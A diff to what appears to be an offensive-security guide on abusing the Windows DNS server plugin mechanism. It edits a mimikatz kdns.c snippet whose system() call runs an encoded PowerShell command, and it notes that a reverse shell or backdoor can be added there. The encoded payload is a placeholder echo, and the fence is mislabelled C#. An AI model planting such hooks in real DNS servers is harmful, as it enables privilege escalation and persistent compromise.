@@ -291,15 +291,14 @@ c:\windows\sytem32\kiwidns.log
 
 We can modify the source code of `kdns.c` from `mimikatz` in order to add a reverse shell or other type of backdoor.
 
-```
+```csharp
 #pragma warning(disable:4996)
 	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
 #pragma warning(pop)
 	{
 		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
 		fclose(kdns_logfile);
-		system("C:\\Windows\\System32\WindowsPowerShell\\v1.0\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==")   //THIS LINE
+		system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==")   //THIS LINE
 	}
 	return ERROR_SUCCESS;
-}
 ```
